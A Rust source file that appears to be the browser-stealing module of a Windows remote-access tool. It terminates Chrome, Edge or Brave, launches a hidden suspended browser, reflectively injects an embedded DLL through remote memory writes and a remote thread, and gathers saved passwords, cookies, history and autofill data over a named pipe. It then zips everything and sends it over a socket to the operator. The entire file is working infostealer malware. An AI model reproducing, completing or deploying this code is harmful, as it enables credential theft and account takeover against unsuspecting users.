use std::io::{Cursor, Write, Read};
use std::ffi::{c_void, OsStr};
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use base64::{engine::general_purpose::STANDARD, Engine};
use serde::{Deserialize, Serialize};
use serde_json::json;
use zip::write::FileOptions;
use zip::ZipWriter;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Pipes::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE};
use windows_sys::Win32::UI::WindowsAndMessaging::*;

use crate::bootstrapper::{realign_pe, realign_pe_end, DllInfo};
use crate::Sock;
use crate::send;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const EMBEDDED_DLL_BASE64: &str = "PAYLOAD_BASE64_HERE";

#[derive(Serialize, Deserialize, Debug)]
struct PasswordData {
    url: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CookieData {
    host: String,
    name: String,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct HistoryData {
    url: String,
    title: String,
    visit_count: i32,
}

#[derive(Serialize, Deserialize, Debug)]
struct AutofillData {
    name: String,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct ProfileData {
    name: String,
    passwords: Vec<PasswordData>,
    cookies: Vec<CookieData>,
    history: Vec<HistoryData>,
    autofill: Vec<AutofillData>,
}

struct BrowserConfig {
    name: &'static str,
    exe_name: &'static str,
    common_paths: &'static [&'static str],
}

const BROWSERS: &[BrowserConfig] = &[
    BrowserConfig {
        name: "Chrome",
        exe_name: "chrome.exe",
        common_paths: &[
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
    },
    BrowserConfig {
        name: "Edge",
        exe_name: "msedge.exe",
        common_paths: &[
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
    },
    BrowserConfig {
        name: "Brave",
        exe_name: "brave.exe",
        common_paths: &[
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
    },
];

fn find_browser_exe(name: &str) -> Option<String> {
    let config = BROWSERS.iter().find(|b| b.name.to_lowercase() == name.to_lowercase())?;
    for path in config.common_paths {
        if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

unsafe fn kill_processes_by_name(exe_name: &str) {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot == INVALID_HANDLE_VALUE {
        return;
    }

    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

    if Process32FirstW(snapshot, &mut entry) != 0 {
        loop {
            let current_exe = String::from_utf16_lossy(&entry.szExeFile);
            let current_exe = current_exe.trim_matches('\0');

            if current_exe.to_lowercase() == exe_name.to_lowercase() {
                let h_process = OpenProcess(PROCESS_TERMINATE, 0, entry.th32ProcessID);
                if h_process != 0 {
                    let _ = TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
    }

    CloseHandle(snapshot);
}

unsafe fn inject_dll_reflective(h_process: HANDLE, dll_bytes: &[u8]) {
    let dos_header = dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return;
    }

    let nt_headers = (dll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize)
        as *const IMAGE_NT_HEADERS64;
    if (*nt_headers).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        return;
    }

    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt_headers).OptionalHeader.ImageBase as *const c_void;

    let mut remote_base = VirtualAllocEx(
        h_process,
        preferred_base,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    let mut relocation_required = false;
    if remote_base.is_null() {
        relocation_required = true;
        remote_base = VirtualAllocEx(
            h_process,
            ptr::null(),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    if remote_base.is_null() {
        return;
    }

    WriteProcessMemory(
        h_process,
        remote_base,
        dll_bytes.as_ptr() as *const c_void,
        (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
        ptr::null_mut(),
    );

    let sections_ptr = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections;

    for i in 0..num_sections {
        let section = &*sections_ptr.add(i as usize);
        if section.PointerToRawData == 0 || section.SizeOfRawData == 0 { continue; }

        let remote_section_addr = (remote_base as usize + section.VirtualAddress as usize) as *mut c_void;
        let local_section_addr = (dll_bytes.as_ptr() as usize + section.PointerToRawData as usize) as *const c_void;

        WriteProcessMemory(h_process, remote_section_addr, local_section_addr, section.SizeOfRawData as usize, ptr::null_mut());
    }

    let h_kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    let load_library_a_ptr = GetProcAddress(h_kernel32, b"LoadLibraryA\0".as_ptr()).unwrap();
    let get_proc_address_ptr = GetProcAddress(h_kernel32, b"GetProcAddress\0".as_ptr()).unwrap();

    let dll_info = DllInfo {
        base: remote_base,
        load_library_a: std::mem::transmute(load_library_a_ptr),
        get_proc_address: std::mem::transmute(get_proc_address_ptr),
        relocation_required,
    };

    let start_ptr = realign_pe as usize;
    let end_ptr   = realign_pe_end as usize;
    let bootstrapper_size = if end_ptr > start_ptr { end_ptr - start_ptr } else { 4096 };

    let total_bootstrap_size = std::mem::size_of::<DllInfo>() + bootstrapper_size;
    let remote_bootstrap_mem = VirtualAllocEx(h_process, ptr::null(), total_bootstrap_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap_mem, &dll_info as *const DllInfo as *const c_void, std::mem::size_of::<DllInfo>(), ptr::null_mut());

    let remote_code_addr = (remote_bootstrap_mem as usize + std::mem::size_of::<DllInfo>()) as *mut c_void;
    WriteProcessMemory(h_process, remote_code_addr, realign_pe as *const c_void, bootstrapper_size, ptr::null_mut());

    let h_thread = CreateRemoteThread(h_process, ptr::null(), 0, std::mem::transmute(remote_code_addr), remote_bootstrap_mem, 0, ptr::null_mut());

    if h_thread != 0 {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

unsafe fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) -> Vec<ProfileData> {
    let mut profiles = Vec::new();
    let cmd_str = format!("{} --headless --disable-gpu", browser_config.exe_name);
    let mut cmd_line: Vec<u16> = OsStr::new(&cmd_str).encode_wide().chain(Some(0)).collect();

    kill_processes_by_name(browser_config.exe_name);

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    startup_info.dwFlags = STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE as u16;

    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

    let mut success = CreateProcessW(
        ptr::null(),
        cmd_line.as_mut_ptr(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null(),
        &mut startup_info,
        &mut process_info,
    );

    if success == 0 {
        if let Some(path) = find_browser_exe(browser_config.name) {
            let cmd_full_str = format!("\"{}\" --headless --disable-gpu", path);
            let mut cmd_full_wide: Vec<u16> = OsStr::new(&cmd_full_str).encode_wide().chain(Some(0)).collect();

            success = CreateProcessW(
                ptr::null(),
                cmd_full_wide.as_mut_ptr(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                CREATE_SUSPENDED,
                ptr::null_mut(),
                ptr::null(),
                &mut startup_info,
                &mut process_info,
            );
        }
    }

    if success != 0 {
        inject_dll_reflective(process_info.hProcess, dll_bytes);
        ResumeThread(process_info.hThread);

        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
        let pipe_handle = CreateNamedPipeW(pipe_name.as_ptr(), PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, ptr::null());

        if pipe_handle != INVALID_HANDLE_VALUE {
            if ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0 || GetLastError() == ERROR_PIPE_CONNECTED {
                let mut buffer = Vec::new();
                let mut temp_buffer = [0u8; 8192];
                loop {
                    let mut bytes_read: u32 = 0;
                    let success = ReadFile(pipe_handle, temp_buffer.as_mut_ptr() as *mut _, temp_buffer.len() as u32, &mut bytes_read, ptr::null_mut());
                    if (success != 0 || GetLastError() == ERROR_MORE_DATA) && bytes_read > 0 {
                        buffer.extend_from_slice(&temp_buffer[..bytes_read as usize]);
                        if success != 0 { break; }
                    } else { break; }
                }

                if !buffer.is_empty() {
                    if let Ok(p) = serde_json::from_slice::<Vec<ProfileData>>(&buffer) {
                        profiles = p;
                    }
                }
            }
            CloseHandle(pipe_handle);
        }

        let _ = TerminateProcess(process_info.hProcess, 0);
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
    profiles
}

pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
    let dll_bytes = match STANDARD.decode(EMBEDDED_DLL_BASE64.trim()) {
        Ok(b) => b,
        Err(_) => {
            send(sock, &format!("[browser_result]{}", json!({"success": false, "error": "DLL decode failed"})));
            return;
        }
    };

    let mut all_profiles = Vec::new();
    if browser_name.to_lowercase() == "all" {
        for config in BROWSERS {
            unsafe { all_profiles.extend(inject_and_collect(&dll_bytes, config)); }
        }
    } else {
        if let Some(config) = BROWSERS.iter().find(|b| b.name.to_lowercase() == browser_name.to_lowercase()) {
            unsafe { all_profiles.extend(inject_and_collect(&dll_bytes, config)); }
        }
    }

    let mut buf = Vec::new();
    let cursor = Cursor::new(&mut buf);
    let mut zip = ZipWriter::new(cursor);
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(0o755);

    let mut pass_count = 0;
    let mut cookie_count = 0;
    let mut history_count = 0;
    let mut autofill_count = 0;

    for (i, profile) in all_profiles.into_iter().enumerate() {
        let prefix = format!("profile_{}/", i + 1);

        // Passwords
        let _ = zip.start_file(format!("{}password.txt", prefix), options);
        for p in &profile.passwords {
            let _ = writeln!(zip, "URL: {}\nUser: {}\nPass: {}\n", p.url, p.username, p.password);
        }
        pass_count += profile.passwords.len();

        // Cookies
        let _ = zip.start_file(format!("{}cookie.txt", prefix), options);
        for c in &profile.cookies {
            let _ = writeln!(zip, "Host: {} | Name: {} | Value: {}", c.host, c.name, c.value);
        }
        cookie_count += profile.cookies.len();

        // History
        let _ = zip.start_file(format!("{}history.txt", prefix), options);
        for h in &profile.history {
            let _ = writeln!(zip, "URL: {} | Title: {} | Visits: {}", h.url, h.title, h.visit_count);
        }
        history_count += profile.history.len();

        // Autofill
        let _ = zip.start_file(format!("{}autofill.txt", prefix), options);
        for a in &profile.autofill {
            let _ = writeln!(zip, "Name: {} | Value: {}", a.name, a.value);
        }
        autofill_count += profile.autofill.len();
    }

    let _ = zip.finish();
    drop(zip);

    let b64 = STANDARD.encode(&buf);

    let result = json!({
        "success": true,
        "browser": browser_name,
        "passwords": pass_count,
        "cookies": cookie_count,
        "history": history_count,
        "autofill": autofill_count,
        "zip": b64
    });

    send(sock, &format!("[browser_result]{}", result));
}
